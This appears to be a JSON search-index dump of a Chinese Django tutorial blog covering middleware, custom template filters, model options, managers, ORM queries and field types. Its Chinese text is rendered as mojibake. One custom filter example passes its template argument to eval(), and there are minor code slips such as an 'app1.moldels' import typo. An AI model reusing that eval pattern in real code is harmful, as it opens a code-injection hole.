13:08","objectID":"/post/2053/:1:1","tags":["python","django"],"title":"django-ä¸­é—´ä»¶","uri":"/post/2053/"},{"categories":["python"],"content":"2.æ³¨å†Œä¸­é—´ä»¶ï¼Œä¿®æ”¹settings.py,åœ¨MIDDLEWARE_CLASSESä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ 'booktest.middleware.TestMiddleware', æ³¨æ„ä¸­é—´ä»¶åŠ è½½æ˜¯æœ‰é¡ºåºçš„,ä»ä¸Šåˆ°ä¸‹æ‰§è¡Œ ","date":"2020-10-14 13:08","objectID":"/post/2053/:1:2","tags":["python","django"],"title":"django-ä¸­é—´ä»¶","uri":"/post/2053/"},{"categories":["python"],"content":"django2.xä»¥ä¸Šçš„ç‰ˆæœ¬ ","date":"2020-10-14 13:08","objectID":"/post/2053/:2:0","tags":["python","django"],"title":"django-ä¸­é—´ä»¶","uri":"/post/2053/"},{"categories":["python"],"content":"1.åœ¨åº”ç”¨ç›®å½•ä¸‹å»ºç«‹middleware.py from django.utils.deprecation import MiddlewareMixin # ç±»åå¯ä»¥è‡ªå®šä¹‰ class TestMiddleware(MiddlewareMixin): \"\"\"ä¸­é—´ä»¶ç±»\"\"\" def __init__(self, get_response): \"\"\"å½“ Web æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œ__init__() åªè¢«è°ƒç”¨ä¸€æ¬¡\"\"\" super().__init__(get_response) print('____initä¸­é—´ä»¶____') def process_request(self, request): \"\"\"äº§ç”Ÿrequestçš„æ—¶å€™è°ƒç”¨ï¼Œåœ¨urlåŒ¹é…ä¹‹å‰\"\"\" print('____requestä¸­é—´ä»¶____') def process_view(self, request, view_fun, *args, **kwargs): \"\"\"urlåŒ¹é…å,è§†å›¾å‡½æ•°è°ƒç”¨å‰\"\"\" print('____viewä¸­é—´ä»¶____') def process_response(self, request, response): \"\"\"è§†å›¾å‡½æ•°è°ƒç”¨åï¼Œè¿”å›ç»™å®¢æˆ·ç«¯å‰è°ƒç”¨\"\"\" print('____responseä¸­é—´ä»¶____') return response def process_exception(self, request, exception): \"\"\"è§†å›¾å‡½æ•°å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè°ƒç”¨æ¬¡å‡½æ•°\"\"\" # return HttpResponse(exception1) print('process_exception---Test1') ","date":"2020-10-14 13:08","objectID":"/post/2053/:2:1","tags":["python","django"],"title":"django-ä¸­é—´ä»¶","uri":"/post/2053/"},{"categories":["python"],"content":"2.æ³¨å†Œä¸­é—´ä»¶ï¼Œä¿®æ”¹settings.py,åœ¨MIDDLEWAREä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ 'booktest3.middleware.TestMiddleware', æ³¨æ„ä¸­é—´ä»¶åŠ è½½æ˜¯æœ‰é¡ºåºçš„,ä»ä¸Šåˆ°ä¸‹æ‰§è¡Œ ","date":"2020-10-14 13:08","objectID":"/post/2053/:2:2","tags":["python","django"],"title":"django-ä¸­é—´ä»¶","uri":"/post/2053/"},{"categories":["python"],"content":"å®˜æ–¹æ–‡æ¡£: https://docs.djangoproject.com/zh-hans/3.1/howto/custom-template-tags/ ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:0","tags":["python","django"],"title":"django-è‡ªå®šä¹‰è¿‡æ»¤å™¨","uri":"/post/2049/"},{"categories":["python"],"content":"1.åˆ›å»ºç›®å½• åœ¨åº”ç”¨ç›®å½•ä¸‹ï¼Œåˆ›å»ºtemplatetagsç›®å½•ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªfilters.pyæ–‡ä»¶ï¼Œåå­—è‡ªå®šä¹‰ã€‚ ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:1","tags":["python","django"],"title":"django-è‡ªå®šä¹‰è¿‡æ»¤å™¨","uri":"/post/2049/"},{"categories":["python"],"content":"2.ç¼–è¾‘filters.py from django import template register = template.Library() # æ— å‚æ•°ï¼Œæ¨¡æ¿è°ƒç”¨æ—¶ä½¿ç”¨å‡½æ•°åå³å¯,ä¾‹{{ 2|mod }} @register.filter def mod(num): \"\"\"åˆ¤æ–­numæ˜¯å¦ä¸ºå¶æ•°\"\"\" return num % 2 == 0 # ä¸ºè¿‡æ»¤å™¨å‘½å,æ¨¡æ¿è°ƒç”¨çš„æ—¶å€™ä½¿ç”¨è¿™ä¸ªåå­—,ä¾‹{{ 'OK'|my_lower }} @register.filter(name=\"my_lower\") def lower(v): \"\"\"è½¬æ¢ä¸ºå°å†™\"\"\" return v.lower() # å¤šå‚æ•°çš„è¿‡æ»¤å™¨,åªæ˜¯ä¸¾ä¸ªä¾‹å­ @register.filter def replace(value, arg): \"\"\"åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦,å¯ä»¥æŒ‡å®šæ¬¡æ•°\"\"\" args = eval(arg) old = args[0] count = args[1] return value.replace(old, '', count) ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:2","tags":["python","django"],"title":"django-è‡ªå®šä¹‰è¿‡æ»¤å™¨","uri":"/post/2049/"},{"categories":["python"],"content":"3.ç¼–å†™æ¨¡æ¿ load: å¡«å†™çš„æ˜¯pyæ–‡ä»¶å {% load filters %} {{ 2|mod }} {{ \"OK\"|my_lower }} {{ \"helloworld\"|replace:\"('o',1)\" }} æ›´å¤šä½¿ç”¨æ–¹æ³•å¯ä»¥æŸ¥çœ‹å†…ç½®è¿‡æ»¤å™¨æ˜¯æ€ä¹ˆå®šä¹‰çš„ lib/python3.6/site-packages/django/template/defaultfilters.py ","date":"2020-10-14 09:59","objectID":"/post/2049/:0:3","tags":["python","django"],"title":"django-è‡ªå®šä¹‰è¿‡æ»¤å™¨","uri":"/post/2049/"},{"categories":["python"],"content":"https://docs.djangoproject.com/zh-hans/3.1/ref/models/options/ åœ¨å®šä¹‰æ¨¡å‹ç±»çš„æ—¶å€™æœ‰ä¸€äº›é¢å¤–çš„é€‰é¡¹å¯ä»¥ä½¿ç”¨,åœ¨æ¨¡å‹ç±»ä¸­å®šä¹‰class Metaå³å¯ï¼š class AreaInfo(models.Model): \"\"\"åœ°åŒºæ¨¡å‹ç±»\"\"\" # åœ°åŒºåç§° atitle = models.CharField(max_length=20) # å…³ç³»å±æ€§, è¡¨ç¤ºå½“å‰åœ°åŒºçš„çˆ¶çº§åœ°åŒº aParent = models.ForeignKey('self', on_delete=models.CASCADE, null=True, blank=True) # å’Œè‡ªå·±å…³è” class Meta: db_table = 'areainfo' # æŒ‡å®šè¡¨å managed = False # å‘Šè¯‰ Django ä¸è¦ç®¡ç†è¿™ä¸ªç±»å¯¹åº”çš„è¡¨çš„åˆ›å»º,ä¿®æ”¹å’Œåˆ é™¤(migrate) ","date":"2020-10-14 09:22","objectID":"/post/2047/:0:0","tags":["python","django"],"title":"django-æ¨¡å‹å…ƒé€‰é¡¹","uri":"/post/2047/"},{"categories":["python"],"content":"1.åœ¨models.pyä¸­æ·»åŠ ä¸€ä¸ªç±» class BookInfoManager(models.Manager): \"\"\"è‡ªå®šä¹‰æ¨¡å‹ç®¡ç†å™¨\"\"\" # 1. æ”¹å˜æŸ¥è¯¢çš„ç»“æœé›† # æ¯”å¦‚ç°åœ¨é€šè¿‡allæ–¹æ³•æ˜¯æŸ¥è¯¢æ‰€æœ‰çš„ç»“æœ,ä½†æ˜¯æˆ‘ä»¬ä¸æƒ³è¦is_delete=1çš„æ•°æ® def all(self): \"\"\"é‡æ–°å°è£…allæ–¹æ³•\"\"\" # 1. è°ƒç”¨çˆ¶ç±»çš„allæ–¹æ³• books = super().all() # 2. è¿‡æ»¤is_delete=1çš„æ•°æ® books = books.exclude(is_delete=1) return books # 2. æ·»åŠ é¢å¤–çš„æ–¹æ³• # å°è£…ä¸€ä¸ªæ·»åŠ æ•°æ®çš„æ–¹æ³• def create_book(self, btitle, bpub_date, bread, bcomment): # selfæ˜¯BookInfoManagerå®ä¾‹åŒ–åçš„å¯¹è±¡ # book_obj = BookInfo() # ç±»åå†™æ­»äº†ä¸å¥½,ç”¨ä¸‹é¢çš„æ–¹æ³• print(self) # selfæ˜¯BookInfoManagerå®ä¾‹åŒ–åçš„å¯¹è±¡ print(self.model) # self.modelå¯ä»¥è·å–åˆ°è°ƒç”¨çš„æ¨¡å‹ç±»å,\u003cclass 'booktest2.models.BookInfo'\u003e book_obj = self.model() # åŠ æ‹¬å·å°±å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªæ¨¡å‹ç±»å¯¹è±¡ book_obj.btitle = btitle book_obj.bpub_date = bpub_date book_obj.bread = bread book_obj.bcomment = bcomment book_obj.save() return self 2.ä¿®æ”¹æ¨¡å‹ç±» class BookInfo(models.Model): # å›¾ä¹¦åç§° btitle = models.CharField(max_length=20) # å‡ºç‰ˆæ—¥æœŸ bpub_date = models.DateField() # é˜…è¯»é‡ bread = models.IntegerField(default=0) # è¯„è®ºé‡ bcomment = models.IntegerField(default=0) # åˆ é™¤æ ‡è®° is_delete = models.BooleanField(default=0) # è‡ªå®šä¹‰ç®¡ç†å™¨å¯¹è±¡,æ›¿æ¢ç»§æ‰¿çš„objects objects = BookInfoManager() def __str__(self): return self.btitle ","date":"2020-10-13 18:32","objectID":"/post/2045/:0:0","tags":["python","django"],"title":"django-æ¨¡å‹è‡ªå®šä¹‰æ¨¡å‹ç®¡ç†å™¨","uri":"/post/2045/"},{"categories":["python"],"content":"å…³è”æŸ¥è¯¢ï¼ˆä¸€å¯¹å¤šï¼‰ å¤šç±»ä¸­å®šä¹‰çš„å»ºç«‹å…³è”çš„ç±»å±æ€§å«åšã€å…³è”å±æ€§ã€‘ å®šä¹‰æ¨¡å‹ç±» # å®šä¹‰ä¸€ä¸ªæ¨¡å‹ç±»ï¼Œç»§æ‰¿models.Model class BookInfo(models.Model): # # idå­—æ®µ,ä¸å†™ä¹Ÿå¯ä»¥ï¼Œé»˜è®¤å°±ä¼šæœ‰idå­—æ®µ # id = models.AutoField(primary_key=True) # å›¾ä¹¦åç§°å­—æ®µã€‚å­—ç¬¦æ•°æ®ç±»å‹å­—æ®µï¼Œæœ€å¤§é•¿åº¦20 btitle = models.CharField(max_length=20, null=False) # å›¾ä¹¦å‡ºç‰ˆæ—¥æœŸå­—æ®µã€‚ bpub_date = models.DateField() def __str__(self): return self.btitle # å®šä¹‰ä¸€ä¸ªäººç‰©æ¨¡å‹ç±»,ä¸å›¾ä¹¦ç±»æ˜¯ä¸€å¯¹å¤šçš„å…³ç³» class HeroInfo(models.Model): # äººç‰©å§“å hname = models.CharField(max_length=20) # äººç‰©æ€§åˆ« hgender = models.BooleanField(default=False) # å¤‡æ³¨ hcomment = models.CharField(max_length=100) # ä¸€æœ¬ä¹¦å¯¹åº”å¤šä¸ªäººç‰©,åœ¨äººç‰©è¿™è¾¹åŠ å¤–é”®ã€‚å…³è”BookInfoè¡¨ hbook = models.ForeignKey('BookInfo', on_delete=models.SET_NULL, null=True, to_field=\"id\") def __str__(self): return self.hname å¯¼å…¥æ¨¡å‹ç±»ï¼š from app1.moldels import BookInfo,HeroInfo ** ä¾‹1ï¼šæŸ¥è¯¢idä¸º1çš„å›¾ä¹¦å…³è”çš„è‹±é›„çš„ä¿¡æ¯ã€‚** é€šè¿‡å¯¹è±¡æŸ¥è¯¢ # å…ˆæŸ¥è¯¢id=1çš„å›¾ä¹¦ b = BookInfo.objects.get(id=1) # æŸ¥è¯¢å…³è”çš„è‹±é›„ # select * from booktest2_heroinfo where hbook_id = 1 b.heroinfo_set.all() é€šè¿‡æ¨¡å‹ç±»æŸ¥è¯¢ï¼š # hbookæ˜¯å…³è”å±æ€§ HeroInfo.objects.filter(hbook__id=1) ** ä¾‹2ï¼šæŸ¥è¯¢idä¸º10çš„è‹±é›„å…³è”çš„å›¾ä¹¦ä¿¡æ¯ã€‚ ** # å…ˆæŸ¥è¯¢id=10çš„è‹±é›„ h = HeroInfo.objects.get(id=10) # åœ¨æŸ¥è¯¢å…³è”çš„å›¾ä¹¦ # select * from booktest2_bookinfo where id = 3 # h.hbook_idæ˜¯3 h.hbook ä¾‹2: é€šè¿‡æ¨¡å‹ç±»æŸ¥è¯¢ æœ€ç»ˆçš„ç»“æœæ˜¯è°å°±å†™é‚£ä¸ªæ¨¡å‹ç±»,å¤šå¯¹ä¸€çš„å…³ç³»ä¸­,å¦‚æœè¿™è¾¹æ˜¯ä¸€çš„è¯ï¼Œå°±ä½¿ç”¨ç±»åå°å†™+å­—æ®µ+æ¯”è¾ƒç±»å‹ åšä¸ºæ¡ä»¶ BookInfo.objects.filter(heroinfo__id=10) ä¾‹1ï¼šæŸ¥è¯¢å›¾ä¹¦ä¿¡æ¯ï¼Œè¦æ±‚å›¾ä¹¦å…³è”çš„è‹±é›„çš„æè¿°åŒ…å«'å…«' æœ€ç»ˆçš„ç»“æœæ˜¯è°å°±å†™é‚£ä¸ªæ¨¡å‹ç±»,å¤šå¯¹ä¸€çš„å…³ç³»ä¸­,å¦‚æœè¿™è¾¹æ˜¯ä¸€çš„è¯ï¼Œå°±ä½¿ç”¨ç±»åå°å†™+å­—æ®µ+æ¯”è¾ƒç±»å‹ åšä¸ºæ¡ä»¶ BookInfo.objects.filter(heroinfo__hcomment__contains='å…«') ä¾‹2ï¼šæŸ¥è¯¢å›¾ä¹¦ä¿¡æ¯ï¼Œè¦æ±‚å›¾ä¹¦ä¸­çš„è‹±é›„çš„idå¤§äº3. BookInfo.objects.filter(heroinfo__id__gt=3) ä¾‹3ï¼šæŸ¥è¯¢ä¹¦åä¸ºâ€œå¤©é¾™å…«éƒ¨â€çš„æ‰€æœ‰è‹±é›„ã€‚ HeroInfoæ¨¡å‹ç±»æœ‰å…³è”å±æ€§ï¼Œå°±ç”¨å…³è”å±æ€§hbookæŸ¥è¯¢ HeroInfo.objects.filter(hbook__btitle='å¤©é¾™å…«éƒ¨') ","date":"2020-10-13 16:02","objectID":"/post/2044/:1:0","tags":["python","django"],"title":"django-æ¨¡å‹å…³è”æŸ¥è¯¢","uri":"/post/2044/"},{"categories":["python"],"content":"å®˜æ–¹æ–‡æ¡£: https://docs.djangoproject.com/zh-hans/3.1/topics/db/aggregation/ ","date":"2020-10-13 13:10","objectID":"/post/2041/:0:0","tags":["python","django"],"title":"django-æ¨¡å‹èšåˆå‡½æ•°","uri":"/post/2041/"},{"categories":["python"],"content":"èšåˆå‡½æ•° ä½œç”¨ï¼šå¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œèšåˆæ“ä½œã€‚å°†ä¸€åˆ—æ•°æ®åšä¸ºä¸€ä¸ªæ•´ä½“,è¿›è¡Œçºµå‘è®¡ç®— sum count avg max min ä½¿ç”¨å‰å¯¼å…¥ï¼š from django.db.models import Sum, Count, Avg, Max, Min ä¾‹ï¼šæŸ¥è¯¢æ‰€æœ‰è®°å½•çš„æ€»æ•°ç›®ã€‚ BookInfo.objects.all().aggregate(Count('id')) {'id__count': 5} ä¾‹ï¼šæŸ¥è¯¢æ‰€æœ‰å›¾ä¹¦é˜…è¯»é‡çš„æ€»å’Œã€‚ BookInfo.objects.aggregate(Sum('bread')) {'bread__sum': 126} ä¾‹ï¼šæŸ¥è¯¢è®°å½•çš„æ€»æ•°ç›®,breadå­—æ®µçš„æœ€å¤§å€¼å’Œæœ€å°å€¼ï¼Œè¿˜å¯ä»¥æä¾›åˆ«å BookInfo.objects.aggregate(book_nums=Count('id'), read_height=Max('bread'), read_low=Min('bread')) {'book_nums': 5, 'read_height': 58, 'read_low': 0} ä¾‹ï¼šæŸ¥è¯¢is_deleteå­—æ®µä¸º0çš„æ•°ç›® # å¯ä»¥é…åˆfilterç­‰æ–¹æ³•ä½¿ç”¨ï¼Œå…ˆæŸ¥å‡ºæ¡ä»¶ç¬¦åˆçš„è®°å½•,åœ¨åšèšåˆ BookInfo.objects.filter(is_delete=0).aggregate(nums=Count('id')) æŸ¥è¯¢æ‰€æœ‰çš„æ—¶å€™all()å¯ä»¥çœç•¥ ","date":"2020-10-13 13:10","objectID":"/post/2041/:1:0","tags":["python","django"],"title":"django-æ¨¡å‹èšåˆå‡½æ•°","uri":"/post/2041/"},{"categories":["python"],"content":"Qå¯¹è±¡~ã€\u0026ã€|æŸ¥è¯¢ ä½œç”¨ï¼šç”¨äºå¤šä¸ªæ¡ä»¶çš„æŸ¥è¯¢ ä½¿ç”¨ä¹‹å‰éœ€è¦å…ˆå¯¼å…¥ï¼š from django.db.models import Q ä¾‹ï¼šæŸ¥è¯¢idå­—æ®µå¤§äº3å’Œbreadå­—æ®µå¤§äº30çš„è®°å½• # é»˜è®¤æŒ‡å®šå¤šä¸ªå‚æ•°å°±æ˜¯å’Œçš„æ„æ€ # select * from booktest2_bookinfo where bread\u003e30 and id \u003e3 BookInfo.objects.filter(id__gt=3, bread__gt=30) # ä½¿ç”¨Qå¯¹è±¡çš„æ–¹å¼ # select * from booktest2_bookinfo where bread\u003e30 and id \u003e3 BookInfo.objects.filter(Q(id__gt=3) \u0026 Q(bread__gt=30)) ä¾‹ï¼šæŸ¥è¯¢idå­—æ®µå¤§äº3æˆ–breadå­—æ®µå¤§äº30çš„è®°å½• # select * from booktest2_bookinfo where bread\u003e30 or id \u003e3 BookInfo.objects.filter(Q(id__gt=3) | Q(bread__gt=30)) ä¾‹ï¼šæŸ¥è¯¢idä¸ç­‰äº3å›¾ä¹¦çš„ä¿¡æ¯ã€‚ select * from booktest2_bookinfo where not id=3; BookInfo.objects.filter(~ Q(id=3)) ","date":"2020-10-13 11:31","objectID":"/post/2040/:1:0","tags":["python","django"],"title":"django-æ¨¡å‹æŸ¥è¯¢å‡½æ•°F\u0026amp;Qå¯¹è±¡,å¤šæ¡ä»¶æŸ¥è¯¢","uri":"/post/2040/"},{"categories":["python"],"content":"Få¯¹è±¡ï¼ˆæ¯”è¾ƒæŸ¥è¯¢ï¼‰ ä½œç”¨ï¼šç”¨äºå­—æ®µä¹‹é—´çš„æ¯”è¾ƒã€‚ ä½¿ç”¨ä¹‹å‰éœ€è¦å…ˆå¯¼å…¥ï¼š from django.db.models import F ä¾‹ï¼šæŸ¥è¯¢breadå­—æ®µå¤§äºbcommentå­—æ®µçš„è®°å½• BookInfo.objects.filter(bread__gt=F('bcomment')) ä¾‹ï¼šæŸ¥è¯¢breadå­—æ®µå¤§äºbcommentå­—æ®µ2å€çš„è®°å½• BookInfo.objects.filter(bread__gt=F('bcomment')*2) ","date":"2020-10-13 11:31","objectID":"/post/2040/:2:0","tags":["python","django"],"title":"django-æ¨¡å‹æŸ¥è¯¢å‡½æ•°F\u0026amp;Qå¯¹è±¡,å¤šæ¡ä»¶æŸ¥è¯¢","uri":"/post/2040/"},{"categories":["python"],"content":"é€šè¿‡æ¨¡å‹ç±».objectså±æ€§å¯ä»¥è°ƒç”¨å¦‚ä¸‹å‡½æ•° get: è¿”å›è¡¨ä¸­æ»¡è¶³æ¡ä»¶çš„ä¸€æ¡ä¸”åªèƒ½æœ‰ä¸€æ¡æ•°æ®ã€‚è¿”å›å€¼æ˜¯ä¸€ä¸ªæ¨¡å‹ç±»å¯¹è±¡ã€‚å‚æ•°ä¸­å†™æŸ¥è¯¢æ¡ä»¶ã€‚ 1)å¦‚æœæŸ¥åˆ°å¤šæ¡æ•°æ®ï¼Œåˆ™æŠ›å¼‚å¸¸MultipleObjectsReturned 2)æŸ¥è¯¢ä¸åˆ°æ•°æ®ï¼Œåˆ™æŠ›å¼‚å¸¸ï¼šDoesNotExist all: è¿”å›æ¨¡å‹ç±»å¯¹åº”è¡¨çš„æ‰€æœ‰æ•°æ®ã€‚è¿”å›å€¼æ˜¯QuerySetç±»å‹ filter: è¿”å›æ»¡è¶³æ¡ä»¶çš„æ•°æ®ã€‚è¿”å›å€¼æ˜¯QuerySetç±»å‹ å‚æ•°å†™æŸ¥è¯¢æ¡ä»¶ã€‚ exclude: è¿”å›ä¸æ»¡è¶³æ¡ä»¶çš„æ•°æ®ã€‚è¿”å›å€¼æ˜¯QuerySetç±»å‹ å‚æ•°å†™æŸ¥è¯¢æ¡ä»¶ã€‚ order_by: å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åºã€‚è¿”å›å€¼æ˜¯QuerySetç±»å‹ å‚æ•°ä¸­å†™æ ¹æ®å“ªäº›å­—æ®µè¿›è¡Œæ’åºã€‚ ","date":"2020-10-13 09:27","objectID":"/post/2032/:0:0","tags":["python","django"],"title":"django-æ¨¡å‹æŸ¥è¯¢å‡½æ•°","uri":"/post/2032/"},{"categories":["python"],"content":"all: æ‰€æœ‰æ•°æ® # BookInfoæ¨¡å‹ç±»å¯¹åº”è¡¨çš„æ‰€æœ‰æ•°æ® b = BookInfo.objects.all() ","date":"2020-10-13 09:27","objectID":"/post/2032/:1:0","tags":["python","django"],"title":"django-æ¨¡å‹æŸ¥è¯¢å‡½æ•°","uri":"/post/2032/"},{"categories":["python"],"content":"filter:æ»¡è¶³æ¡ä»¶ # æŒ‡å®šæŸ¥è¯¢ __exact(å¯å¿½ç•¥) iexact:ä¸åŒºåˆ†å¤§å°å†™ b = BookInfo.objects.filter(id__exact=1) # è¿™å¹¶ä¸ä¼šæŸ¥è¯¢ï¼Œåªæœ‰åœ¨è°ƒç”¨çš„æ—¶å€™æ‰ä¼šçœŸæ­£æŸ¥è¯¢ b[0].btitle # æ¨¡ç³ŠæŸ¥è¯¢ __contains # select * from booktest2_bookinfo where btitle like binray '%å¤©%' b = BookInfo.objects.filter(btitle__contains=\"å¤©\") # btitleå­—æ®µå«å¤©çš„è®°å½• b = BookInfo.objects.filter(btitle__startswith='å¤©') # btitleå­—æ®µä»¥å¤©å¼€å¤´çš„è®°å½• b = BookInfo.objects.filter(btitle__endswith='éƒ¨') # btitleå­—æ®µä»¥éƒ¨ç»“å°¾çš„è®°å½• # æ¯”è¾ƒæŸ¥è¯¢ __gt,__lt,__gte,__lte # select * from booktest2_bookinfo where id \u003e 2 b = BookInfo.objects.filter(id__gt=2) # idå¤§äº2çš„è®°å½• # èŒƒå›´æŸ¥è¯¢ __in # select * from booktest2_bookinfo where id in (1, 3, 5) b = BookInfo.objects.filter(id__in=[1,3,5]) # idä¸º1,3,5çš„è®°å½• # åˆ¤ç©ºæŸ¥è¯¢ __isnull # select * from booktest_bookinfo where btitle is null; b = BookInfo.objects.filter(btitle__isnull=True) # æŸ¥è¯¢btitleå­—æ®µä¸ºnullçš„è®°å½• # æ—¥æœŸæŸ¥è¯¢__xxx # æŸ¥æ‰¾æŒ‡å®šå¹´æœˆçš„è®°å½• # select * from booktest2_bookinfo where bpub_date between '1980-01-01' and '1980-12-31' BookInfo.objects.filter(bpub_date__year=1980) # bpub_dateå­—æ®µæ˜¯1980å¹´çš„è®°å½• # select * from booktest2_bookinfo where extract(month from bpub_date) = 5 BookInfo.objects.filter(bpub_date__month=5) # bpub_dateå­—æ®µæ˜¯5æœˆçš„è®°å½• # æ—¥æœŸæ¯”è¾ƒ from datetime import date # select * from booktest2_bookinfo where bpub_date \u003e '1980-01-01' BookInfo.objects.filter(bpub_date__gt=date(1980,1,1)) # å¤§äº1980å¹´1æœˆ1æ—¥çš„è®°å½• # select * from booktest2_bookinfo where bpub_date \u003e= '1986-7-24' BookInfo.objects.filter(bpub_date__gte='1986-7-24') # å¤§äºç­‰äº1986å¹´7æœˆ24æ—¥çš„è®°å½• ","date":"2020-10-13 09:27","objectID":"/post/2032/:2:0","tags":["python","django"],"title":"django-æ¨¡å‹æŸ¥è¯¢å‡½æ•°","uri":"/post/2032/"},{"categories":["python"],"content":"exclude: æ’é™¤ # æŸ¥è¯¢idä¸ä¸º3çš„è®°å½• select * from booktest2_bookinfo where not id=3; BookInfo.objects.exclude(id=3) ","date":"2020-10-13 09:27","objectID":"/post/2032/:3:0","tags":["python","django"],"title":"django-æ¨¡å‹æŸ¥è¯¢å‡½æ•°","uri":"/post/2032/"},{"categories":["python"],"content":"order_by: æ’åº # æŒ‰ç…§idä»å°åˆ°å¤§æ’åº BookInfo.objects.all().order_by('id') # æŒ‰ç…§idä»å¤§åˆ°å°æ’åº BookInfo.objects.all().order_by('-id') # å¯ä»¥åŸºäºä¸Šé¢å‡ ä¸ªæ–¹æ³•è¿›è¡Œæ’åº BookInfo.objects.filter(id__gt=2).order_by('id') # å…ˆæŸ¥æ‰¾id\u003e2çš„è®°å½•ï¼Œç„¶ååœ¨æ ¹æ®idæ’åº ","date":"2020-10-13 09:27","objectID":"/post/2032/:4:0","tags":["python","django"],"title":"django-æ¨¡å‹æŸ¥è¯¢å‡½æ•°","uri":"/post/2032/"},{"categories":["python"],"content":"https://docs.djangoproject.com/zh-hans/3.1/ref/models/fields/#field-options ","date":"2020-10-12 17:36","objectID":"/post/2029/:0:0","tags":["python","django"],"title":"django-æ¨¡å‹ç±»å¸¸ç”¨å­—æ®µç±»å‹","uri":"/post/2029/"},{"categories":["python"],"content":"å­—æ®µç±»å‹ AutoField è‡ªåŠ¨å¢é•¿çš„IntegerFieldï¼Œé€šå¸¸ä¸ç”¨æŒ‡å®šï¼Œä¸æŒ‡å®šæ—¶Djangoä¼šè‡ªåŠ¨åˆ›å»ºå±æ€§åä¸ºidçš„è‡ªåŠ¨å¢é•¿å±æ€§ã€‚ BooleanField å¸ƒå°”å­—æ®µï¼Œå€¼ä¸ºTrueæˆ–Falseã€‚ NullBooleanField æ”¯æŒNullã€Trueã€Falseä¸‰ç§å€¼ CharField å­—ç¬¦ä¸²ã€‚å‚æ•°max_lengthè¡¨ç¤ºæœ€å¤§å­—ç¬¦ä¸ªæ•° TextField å¤§æ–‡æœ¬å­—æ®µï¼Œä¸€èˆ¬è¶…è¿‡4000ä¸ªå­—ç¬¦æ—¶ä½¿ç”¨ã€‚ IntegerField æ•´æ•° DecimalField åè¿›åˆ¶æµ®ç‚¹æ•°ã€‚å‚æ•°max_digitsè¡¨ç¤ºæ€»ä½æ•°ã€‚å‚æ•°decimal_placesè¡¨ç¤ºå°æ•°çš„ä½æ•°ã€‚ FloatField æµ®ç‚¹æ•°ã€‚å‚æ•°åŒä¸Šã€‚æ²¡æœ‰ä¸Šé¢çš„ç²¾ç¡®åº¦é«˜ DateField æ—¥æœŸ 1)auto_nowè¡¨ç¤ºæ¯æ¬¡ä¿å­˜æ—¶ï¼Œè‡ªåŠ¨è®¾ç½®è¯¥å­—æ®µä¸ºå½“å‰æ—¶é—´ï¼Œç”¨äº\"æœ€åä¸€æ¬¡ä¿®æ”¹\"çš„æ—¶é—´æˆ³ï¼Œå®ƒæ€»æ˜¯ä½¿ç”¨å½“å‰æ—¥æœŸï¼Œé»˜è®¤ä¸ºfalseã€‚ 2)auto_now_addè¡¨ç¤ºå½“å¯¹è±¡ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è®¾ç½®å½“å‰æ—¶é—´ï¼Œç”¨äºåˆ›å»ºçš„æ—¶é—´æˆ³ï¼Œå®ƒæ€»æ˜¯ä½¿ç”¨å½“å‰æ—¥æœŸï¼Œé»˜è®¤ä¸ºfalseã€‚ 3)auto_now_addå’Œauto_nowæ˜¯ç›¸äº’æ’æ–¥çš„ï¼Œç»„åˆå°†ä¼šå‘ç”Ÿé”™è¯¯ã€‚åªèƒ½äºŒé€‰ä¸€ TimeField æ—¶é—´ï¼Œå‚æ•°åŒDateField DateTimeField æ—¥æœŸæ—¶é—´ï¼Œå‚æ•°åŒDateFieldã€‚ FileField ä¸Šä¼ æ–‡ä»¶å­—æ®µã€‚ ImageField ç»§æ‰¿äºFileFieldï¼Œå¯¹ä¸Šä¼ çš„å†…å®¹è¿›è¡Œæ ¡éªŒï¼Œç¡®ä¿æ˜¯æœ‰æ•ˆçš„å›¾ç‰‡ã€‚ ","date":"2020-10-12 17:36","objectID":"/post/2029/:1:0","tags":["python","django"],"title":"django-æ¨¡å‹ç±»å¸¸ç”¨å­—æ®µç±»å‹","uri":"/post/2029/"},{"categories":["python"],"content":"å­—æ®µå±æ€§ default é»˜è®¤å€¼ã€‚è®¾ç½®é»˜è®¤å€¼ã€‚ primary_key è‹¥ä¸ºTrueï¼Œåˆ™è¯¥å­—æ®µä¼šæˆä¸ºæ¨¡å‹çš„ä¸»é”®å­—æ®µï¼Œé»˜è®¤å€¼æ˜¯Falseï¼Œä¸€èˆ¬ä½œä¸ºAutoFieldçš„é€‰é¡¹ä½¿ç”¨ã€‚ unique å¦‚æœä¸ºTrue, è¿™ä¸ªå­—æ®µåœ¨è¡¨ä¸­å¿…é¡»æœ‰å”¯ä¸€å€¼ï¼Œé»˜è®¤å€¼æ˜¯Falseã€‚ db_index è‹¥å€¼ä¸ºTrue, åˆ™åœ¨è¡¨ä¸­ä¼šä¸ºæ­¤å­—æ®µåˆ›å»ºç´¢å¼•ï¼Œé»˜è®¤å€¼æ˜¯Falseã€‚ db_column å­—æ®µçš„åç§°ï¼Œå¦‚æœæœªæŒ‡å®šï¼Œåˆ™ä½¿ç”¨å±æ€§çš„åç§°ã€‚ null å¦‚æœä¸ºTrueï¼Œè¡¨ç¤ºå…è®¸ä¸ºç©ºï¼Œé»˜è®¤å€¼æ˜¯Falseã€‚ blank å¦‚æœä¸ºTrueï¼Œåˆ™è¯¥å­—æ®µå…è®¸ä¸ºç©ºç™½ï¼Œé»˜è®¤å€¼æ˜¯Falseã€‚å†³å®šåå°ç®¡ç†çš„è¡¨å•è¾“å…¥æ¡†å¯å¦ä¸ºç©º ","date":"2020-10-12 17:36","objectID":"/post/2029/:2:0","tags":["python","django"],"title":"django-æ¨¡å‹ç±»å¸¸ç”¨å­—æ®µç±»å‹","uri":"/post/2029/"},{"categories":["python"],"content":"raise ImproperlyConfigured(â€˜mysqlclient 1.4.0 or newer is required; you have %s.â€™ % Database.version) django.core.exceptions.ImproperlyConfigured: mysqlclient 1.4.0 or newer is required; you have 0.10.1. 